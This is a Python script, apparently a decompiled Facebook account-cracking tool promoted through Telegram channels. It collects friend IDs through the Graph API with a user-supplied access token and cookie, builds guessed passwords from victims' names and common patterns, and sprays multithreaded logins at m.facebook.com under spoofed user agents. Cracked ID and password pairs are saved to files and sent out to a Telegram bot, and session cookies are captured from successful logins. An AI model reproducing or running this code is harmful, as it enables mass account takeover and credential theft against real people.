# DeCoDe By @CP_OK2
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
AB_A = '\x1b[1;97m'
RS = '\x1b[30m'
AH_F = '\x1b[31m'
AKH_F = '\x1b[32m'
AS_T = '\x1b[33m'
SM = '\x1b[34m'
BN = '\x1b[35m'
AZ_T = '\x1b[36m'
AB_KH = '\x1b[37m'
AH_T = '\x1b[91m'
AKH_T = '\x1b[92m'
AS_F = '\x1b[93m'
WR = '\x1b[95m'
p = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
O = '\x1b[0;96m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
MJ4 = '\x1b[38;5;106m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
AB_A = '\x1b[1;97m'
RS = '\x1b[30m'
AH_F = '\x1b[31m'
AKH_F = '\x1b[32m'
AS_T = '\x1b[33m'
SM = '\x1b[34m'
BN = '\x1b[35m'
AZ_T = '\x1b[36m'
AB_KH = '\x1b[37m'
AH_T = '\x1b[91m'
AKH_T = '\x1b[92m'
AS_F = '\x1b[93m'
WR = '\x1b[95m'
p = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
O = '\x1b[0;96m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
MJ4 = '\x1b[38;5;106m'
import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from time import sleep
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import random
import os
import sys
import time
import os
import sys
import time
import json
import random
import re
import string
import platform
import base64
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import webbrowser
webbrowser.open('https://t.me/ZZKGZ')
import webbrowser
import requests
import time
import pyfiglet
import datetime
#import datetime;now = datetime.date.today();target = #datetime.date(2024,1,10)
#if now >=target:exit("وقفت الأدآة دخن لا ضوج 🗿🚬 راسلني حتى افعلها @fahad_zaim")
#else:print("✅شغالة")
from threading import (Thread, Event)
import webbrowser
lo = '''
حب اشترك بلقناة اول
https://t.me/ZZKGZ
'''
print(f'\033[1;31m{lo}')

na = webbrowser.open ('https://t.me/ZZKGZ')

try:
    import rich
except:
    cetak(nel('\t• VIP •'))
    os.system('pip3.9 install rich')

try:
    import stdiomask
except:
    cetak(nel('\VIP'))
    os.system('pip3.9 install stdiomask')

try:
    import requests
except:
    Z = '\x1b[1;31m'
R = '\x1b[1;31m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
C = '\x1b[1;97m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'
E = '\x1b[1;31m'
B = '\x1b[2;36m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
import os
try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')
output = render('F A H AD', colors=['white', 'blue'], align='center')
print(output)
print('# DeCoDe By @CP_OK2')
print('────────────\n• معرفي ➪ @fahad_zaim •──────────────')
token = input('\x1b[1;31mT\x1b[1;32mO\x1b[1;34mK\x1b[1;32mE\x1b[1;32mN\x1b[1;36m :\x1b[1;34m ')
print('\n')
ID = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m   : ')
tlg1 = '\nتم تشغيل اداة الزعيم المدفوعة 🥶🔥\n• معرف قناتي ➪ قناتي لفك تشفير @ZZKGZ •————————————\n ────────⧏ 𝐙𝐀𝐈𝐌 ⧐────────\nشكرا لك على تشغيل اداتنا المدفوعة نتمنى لك تجربة ممتعة 🔥❤  ➩ \n 𝐙𝐀𝐈𝐌\n    \nلا تـنسى ان تـرسل صـور الـصيد -  @fahad_zaim\n\n────────⧏ 𝐙𝐀𝐈𝐌 ⧐──────── '
requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg1))
os.system('clear')
print('—'*25)
print('• •')
print('—'*25)
print('# DeCoDe By @CP_OK2')
cetak(nel('\t• 𝐙𝐀𝐈𝐌 •'))
pretty.install()
CON = sol()
ugen2 = [
    'NokiaC2-01/5.0 (11.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; ar; nokiac2-01) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0']
ugen = [
    'NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Opera/9.80 (Android; Opera Mini/7.5.33361/191.273; U; pt) Presto/2.12.423 Version/12.16 UNTRUSTED/1.0']
cokbrut = []
ses = requests.Session()
princp = []
for xd in range(10000):
    a = 'Nokia5350/10.1.011 (SymbianOS/10;'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Series63/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1)'
    e = random.randrange(100, 9999)
    f = 'AppleWebKit/525 (KHTML, like Gecko)'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Safari/525 3gpp-gba'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2.append(uaku)
    aa = 'NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (SymbianOS/9.2; U;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Series60/3.1 NokiaE71-1/100.07.57; Profile/MIDP-2.0 Configuration/CLDC-1.1 )'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/413 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Safari/413 UNTRUSTED/1.0'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'SAMSUNG SM-X906B)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/100.0.4896.88 Safari/537.36 UNTRUSTED/1.0'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'nokiac1-01)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'U2/1.0.0 UCBrowser/8.9.0.251'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'U2/1.0.0 Mobile UNTRUSTED/1.06'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
(id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss = []
pwnya = []
asu = random.choice([
    m,
    O,
    h,
    u,
    b,
    MJ3,
    MJ2,
    MJ,
    AS2,
    AH2,
    B,
    WR,
    AS_F,
    AKH_T,
    AH_T,
    AB_KH,
    AZ_T,
    BN,
    SM,
    AS_T,
    AKH_F,
    AH_F,
    RS,
    AB_A,
    Z,
    p,
    b,
    kk,
    hh,
    x,
    Y,
    P,
    u,
    B,
    J,
    MJ4,
    p])
print('')
print('\x1b[1;49m\n\n')
print('')
sleep(4)
os.system('clear')
dic = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'August',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'Devember' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def fak_xy(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


def back():
    login()


def banner():
    print('')
    print(f'''\t{asu}''')
    print('')


def login():
    
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        tokenku.append(token)
        
        try:
            basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token=' + tokenku[0], cookies={'cookie': cok })
            SDM()
        except:
            login_lagi334()
    except requests.exceptions.ConnectionError:
            li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
            lo = mark(li, style='red')
            sol().print(lo, style='cyan')
            exit()


def login_lagi334():
    try:
        os.system('clear')
        banner()
        cok = input(' ڪوڪيز cookies  = ')
        cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = sop(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
        dat  = {}
        raq  = pos.find('form',{'method':'post'})
        for x in raq('input',{'value':True}):
            try:
                if x['name'] == '__CANCEL__':
                    pass
                else:
                    dat.update({x['name']:x['value']})
            except Exception as e:
                pass
        rel = 'https://mbasic.facebook.com' + raq['action']; pos = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json()
        tok = req['access_token']
        kot = open('.token.txt','w').write(tok)
        koc = open('.cok.txt','w').write(cok)
        masuk = input('\n[VIP]  tekan enter')
        os.system('clear')
        login()
    except Exception as e:
        print(e)




asu = random.choice([
    m,
    O,
    h,
    u,
    b,
    MJ3,
    MJ2,
    MJ,
    AS2,
    AH2,
    B,
    WR,
    AS_F,
    AKH_T,
    AH_T,
    AB_KH,
    AZ_T,
    BN,
    SM,
    AS_T,
    AKH_F,
    AH_F,
    RS,
    AB_A,
    Z,
    p,
    b,
    kk,
    hh,
    x,
    Y,
    P,
    u,
    B,
    J,
    MJ4,
    p])
dic = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'August',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'Devember' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def fak_xy(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()


def clear():
    os.system('clear')


def back():
    login()


def banner():
    print(f'''\t{asu}''')
    print(' ')


def SDM():
    os.system('clear')
    banner()
    print(f'''\x1b[1;34m_____________________________________⠀\n
	
	تم تحديث اخر اصدار من الاداة المدفوعة (القيادة 𝐙𝐀𝐈𝐌)
	# DeCoDe By @CP_OK2
_________________________________________________________
⠀
''')
    print (f'''\x1b[1;32m \n
——————————————\n• معرف قناتي @ZZKGZ •\n——————————————
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█𝐙𝐀𝐈𝐌▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
# DeCoDe By @CP_OK2
——————————————\n• معرفي للتواصل  @fahad_zaim •\n——————————————
                                    ''' )	
    ip = requests.get('https://api.ipify.org').text
    gh = 'h'
    print('# DeCoDe By @CP_OK2')
    print(f'''{H} [1]  صـيد من ملف ''')
    
    _____alvino__adijaya_____ = input(f'''{u}   اختاࢪ : ''')
    if _____alvino__adijaya_____ in ('𝐙𝐀𝐈𝐌',):
        dump_massal()
    elif _____alvino__adijaya_____ in ('1',):
        crack_file()


def error():
    print(f'''{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}''')
    time.sleep(4)
    back()


def crack_file():
    
    try:
        print('')
        SDMF = input(' \x1b[94;1m اڪتب مساࢪ الملف: \x1b[92;1m: \x1c[92;1m ')
        for line in open(SDMF, 'r').readlines():
            id.append(line.strip())
        setting()
    except:
        pass
    exit(f'''\n{M}File %s not found''' % SDMF)
    return None



def setting():
    hu = '3'
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('3', '03'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        exit()
    hc = '1'
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('2', '02'):
        method.append('mbasic')
    else:
        method.append('mobile')
    print(f'''{N}│''')
    passwrd()


def dump_massal():
    with requests.Session() as ses:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        a = input(f''' {u}ID : ''')
        
        try:
            params = {
                'fields': 'name,friends.fields(id,name,birthday)',
                'access_token': token
            }
            b = ses.get('https://graph.facebook.com/{}'.format(a), params, cookies={'cookie': cok }).json()
            for c in b['friends']['data']:
                id.append(c['id'] + '|' + c['name'])
            yu = f'''{b} Total ID :  \x1b[2;32m ''' + str(len(id))
            print(yu)
            setting()
        except Exception as e:
            print(e)
            




def dump_massal():
    with requests.Session() as ses:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    try:
        print('')
        kumpulkan = int(input(f'''    {H}NUMBER IDS : '''))
        print('')
        
    except ValueError:
        exit()
    if kumpulkan<1 or kumpulkan>1000:
        exit()
    ses=requests.Session()
    bilangan = 0
    for KOTG49H in range(kumpulkan):
        bilangan+=1
        Masukan = input(f''' {N}[-] Your Id ''' + str(bilangan) + ' : ')
        uid.append(Masukan)
    for user in uid:
        try:
           head = (
           {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
           })
           if len(id) == 0:
               params = (
               {
               'access_token': token,
               'fields': "friends"
               }              
           )
           else:
               params = (
               {
               'access_token': token,
               'fields': "friends"
               }               
           )
           url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
           for xr in url['friends']['data']:
               try:
                   woy = (xr['id']+'|'+xr['name'])
                   if woy in id:pass
                   else:id.append(woy)
               except:continue
        except (KeyError,IOError):
          pass
        except requests.exceptions.ConnectionError:
            exit()
    try:
          op = f''' [{H}-{N}] {K}Total {H} : ''' + str(len(id))
          print('')
          print(op)
          setting() 
    except Exception as e:
        print(e) 
        exit()





def setting():
    wl = f''''''
    hu = '3'
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('3', '03'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        ric = ''
        sol().print(mark(ric, style='green'))
        exit()
    hc = '1'
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('',):
        print('[+] PILIH YANG BENAR BANG ')
        setting()
    elif hc in ('4', '04'):
        method.append('mbasic')
    else:
        method.append('mobile')
    print('')
    _jembot_ = 'Y'
    os.system('clear')
    if _jembot_ in ('',):
        print('>> Pilih Yang Bener Kontol ')
        back()
    elif _jembot_ in ('y', 'Y'):
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    pwplus = 't'
    if pwplus in ('y', 'Y'):
        pwpluss.append('ya')
        cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
        pwku = input('>> Masukkan Password Tambahan : ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    passwrd()


def passwrd():
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                	pwv.append(nmf)
                	pwv.append('frs+frs')
                	pwv.append(frs+'1234567')
                	pwv.append('firstlast')
                	pwv.append('first1234567')
                	pwv.append('١٢٣٤٥٦')
                	pwv.append('١٢٣٤٥٦٧٨٩')
                	pwv.append('20202020')
                	pwv.append('102030405060')
                	pwv.append('1@2@3@4@5@')
                	pwv.append('1@2@3@4@5@6@')
                	pwv.append('ppooiiuuyy')
                	pwv.append('zzxxccvv')
                	pwv.append('qqwweerr')
                	pwv.append('zxcvzxcv')
                	pwv.append('qwertyuiopasdfghjkl')
                	pwv.append('mmmmnnnn')
                	pwv.append('mmnnbbvv')
                	pwv.append('5544332211')
                	pwv.append('123456qwerty')
                	pwv.append('qqwweerrtt')
                	pwv.append('11223344556677')
                	pwv.append('112233445566')
                	pwv.append('12345@@')
                	pwv.append('123457@')
                	pwv.append('55667788')
                	pwv.append('1020304050')
                	pwv.append('1122334455')
                	pwv.append('12345@12345')
                	pwv.append('07800780')
                	pwv.append('07700770')
                	pwv.append('0099887766')
                	pwv.append('12345qwerty')
                	pwv.append('123456qwerty')
                	pwv.append('1q2w3e4r5t6y')
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
            		pwv.append(nmf)
            		pwv.append('frs+frs')
            		pwv.append(frs+'1234567')
            		pwv.append('firstlast')
            		pwv.append('first1234567')
            		pwv.append('١٢٣٤٥٦')
            		pwv.append('١٢٣٤٥٦٧٨٩')
            		pwv.append('20202020')
            		pwv.append('102030405060')
            		pwv.append('1@2@3@4@5@')
            		pwv.append('1@2@3@4@5@6@')
            		pwv.append('ppooiiuuyy')
            		pwv.append('zzxxccvv')
            		pwv.append('qqwweerr')
            		pwv.append('zxcvzxcv')
            		pwv.append('qwertyuiopasdfghjkl')
            		pwv.append('mmmmnnnn')
            		pwv.append('mmnnbbvv')
            		pwv.append('5544332211')
            		pwv.append('123456qwerty')
            		pwv.append('qqwweerrtt')
            		pwv.append('11223344556677')
            		pwv.append('112233445566')
            		pwv.append('12345@@')
            		pwv.append('123457@')
            		pwv.append('55667788')
            		pwv.append('1020304050')
            		pwv.append('1122334455')
            		pwv.append('12345@12345')
            		pwv.append('07800780')
            		pwv.append('07700770')
            		pwv.append('0099887766')
            		pwv.append('12345qwerty')
            		pwv.append('123456qwerty')
            		pwv.append('1q2w3e4r5t6y')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'touch' in method:
                pool.submit(cracktouch, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
                pool.submit(crackmbasic, idf, pwv)
    print('')
    cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
    print(f'''[{b}•{x}]{h} OK : {h}%s ''' % ok)
    print(f'''{x}[{b}•{x}]{k} CP : {k}%s{x} ''' % cp)
    print('')
    print('>> Lanjut Crack Kembali ( Y/t ) ? ')
    woi = input('>> Pilih : ')
    if woi in ('y', 'Y'):
        back()
    else:
        print(f'''\t{x}[=]{k} Been completed {x} <> ''')
        time.sleep(2)
        exit()


def crack(idf, pwv):
    global cp, ok, ok, loop
    bo = random.choice([
        m,
        k,
        h,
        b,
        u,
        x])
    rc = random.choice
    amr = rc([
        ''])
    (sys.stdout.write(f'''\r{bo}({amr}𝐙𝐀𝐈𝐌) {loop}•{len(id)}  • OK:{ok} •  CP:{cp} • ({'{:.0%}'.format(loop / float(len(id)))}{amr})'''),)
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        
        try:
            tix = time.time()
            ses.headers.update({
                'Host': 'm.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': ua2,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                'uid': idf,
                'flow': 'login_no_pin',
                'pass': pw,
                'next': 'https://developers.facebook.com/tools/debug/accesstoken/' }
            ses.headers.update({
                'Host': 'm.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://m.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf + '|' + pw)
                    ceker(idf, pw)
                else:
                    print('\n')
                    print('# DeCoDe By @CP_OK2')
                    statuscp = f'''سكيور للاسف لاتزعل من الزعيم 🔥😂 ⋘─────━𓅓𝐙𝐀𝐈𝐌𓅓─────━⋙ \n ❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n ⋘─────━𓅓𝐙𝐀𝐈𝐌𓅓─────━⋙قناتي لفك تشفير @ZZKGZ '''
                    statuscp1 = nel(statuscp, style='red')
                    cetak(nel(statuscp1, title='SESI'))
                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    akun.append(idf + '|' + pw)
                    cp += 1
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statuscp))
            
            if 'c_user' in ses.cookies.get_dict().keys():
                headapp = {
                    'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+' }
                if 'no' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
